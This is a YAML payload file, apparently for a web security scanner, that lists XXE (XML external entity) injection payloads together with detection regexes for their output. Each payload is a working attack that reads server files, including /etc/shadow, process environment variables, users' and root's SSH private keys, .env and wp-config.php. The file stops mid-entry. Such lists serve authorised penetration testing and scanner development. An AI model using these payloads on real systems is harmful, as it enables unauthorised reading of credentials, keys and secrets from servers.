metadata:
  type: xxe/basic
  version: "1.0"
  description: "XXE injection payloads"
  sources: ["OWASP", "PortSwigger", "PayloadsAllTheThings", "HackTricks"]

detection_patterns:
  - "root:.*?:0:0:"
  - "(?i)ENTITY"
  - "(?i)DOCTYPE"
  - "(?i)SYSTEM"

payloads:
  file_read:
    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"
      description: "Basic XXE file read /etc/passwd"
      severity: critical
      tags: [file_read, basic, linux]

    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><root>&xxe;</root>"
      description: "XXE read /etc/shadow"
      severity: critical
      tags: [file_read, linux]

    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><root>&xxe;</root>"
      description: "XXE read /etc/hosts"
      severity: high
      tags: [file_read, linux]

    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><root>&xxe;</root>"
      description: "XXE read hostname"
      severity: high
      tags: [file_read, linux]

    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/version\">]><root>&xxe;</root>"
      description: "XXE read kernel version"
      severity: high
      tags: [file_read, linux]

    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><root>&xxe;</root>"
      description: "XXE read process env"
      severity: critical
      tags: [file_read, linux]

    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/cmdline\">]><root>&xxe;</root>"
      description: "XXE read cmdline"
      severity: high
      tags: [file_read, linux]

    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/issue\">]><root>&xxe;</root>"
      description: "XXE read OS version"
      severity: high
      tags: [file_read, linux]

    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/group\">]><root>&xxe;</root>"
      description: "XXE read group"
      severity: high
      tags: [file_read, linux]

    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/ssh/sshd_config\">]><root>&xxe;</root>"
      description: "XXE read SSH config"
      severity: high
      tags: [file_read, linux]

    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///home/user/.ssh/id_rsa\">]><root>&xxe;</root>"
      description: "XXE read SSH key"
      severity: critical
      tags: [file_read, linux]

    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///root/.ssh/id_rsa\">]><root>&xxe;</root>"
      description: "XXE read root SSH key"
      severity: critical
      tags: [file_read, linux]

    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///var/www/html/.env\">]><root>&xxe;</root>"
      description: "XXE read .env"
      severity: critical
      tags: [file_read, linux]

    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///var/www/html/wp-config.php\">]><root>&xxe;</root>"
      description: "XXE read WordPress config"
      severity: critical
      tags: [file_read, linux]

    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/httpd/conf/httpd.conf\">]><root>&xxe;</root>"
      description: "XXE read Apache config"
      severity: high
      tags: [file_read, linux]

    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/nginx/nginx.conf\">]><root>&xxe;</root>"
      description: "XXE read Nginx config"
      severity: high
